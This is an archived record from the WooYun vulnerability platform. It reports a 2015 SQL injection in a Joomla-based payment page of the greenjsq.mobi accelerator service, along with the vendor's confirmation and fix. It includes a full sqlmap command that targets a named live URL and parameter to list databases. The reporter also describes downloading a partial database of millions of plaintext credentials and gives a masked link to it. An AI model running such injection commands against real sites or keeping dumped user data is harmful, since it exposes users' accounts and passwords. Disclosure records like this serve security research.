{"id": 30281, "wybug_id": "wooyun-2015-0110710", "wybug_title": "Green网络加速器某一低级注入引发的数千万用户账号和明文密码泄漏", "wybug_corp": "greenjsq.mobi", "wybug_author": "路人甲", "wybug_date": "2015-04-28 22:02", "wybug_open_date": "2015-06-13 10:14", "wybug_type": "用户资料大量泄漏", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["用户敏感信息泄漏", "用户敏感信息泄露", "数据库被下载"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-28：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-05-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-05-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-05-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-06-13：\t细节向公众公开  简要描述： 之前提交过，以为忘记注入点只记得数据库的地址的和账号密码，所以没通过，这次补全一点吧。 详细说明：  这个漏洞的引发是因为一个CMS的功能所导致。Joomla，这个CMS有一个功能可以编写一些PHP页面，虽然很方便，但是对于PHP审核不行的码农来说容易造成sql注入漏洞。   漏洞证明：  \nC:\\Windows\\SysWOW64>python F:\\1204\\sqlmap\\sqlmap.py -u \"https://www.greenjsq.mobi/my_alipayto.php\" --data \"username=&prodid=124&aliorder=VIP%E4%B8%A4%E5%B9%B4%E5%A5%97%E9%A4%90&alibody=%E6%97%B6%E9%95%BF24%2B5%E4%B8%AA%E6%9C%88%EF%BC%8C%E9%99%902%E5%8F%B0%E7%BB%88%E7%AB%AF%E5%90%8C%E6%97%B6%E4%BD%BF%E7%94%A8&alimoney=258&buy.x=66&buy.y=18\" -p prodid --dbs --thread 10\n这个是所有的数据库\n\n所有数据库的账号和密码\n\n但是密码被更改了，不过在更改之前我备份了个不完整的数据库，但是也有百万的用户数据。密码账号邮箱号等等都是明文储存。\n\nmask 区域\n1.http://**.**.**/s/1eQ8e7C2_*****^:n*****\n\n审核人员看完请删除网盘连接。   修复方案：  function and safety.Witch one is more important?Both are important.   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-04-29 10:13 厂商回复： 已排查并修复漏洞。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-29 10:16 |    \t\t’‘Nome \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:19        | 在此感谢 @M4sk @mango @裤裆 @泳少 @5up3r...)\t\t \n  人生难得醉一次，只求洞主送个裤子- -!!!    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}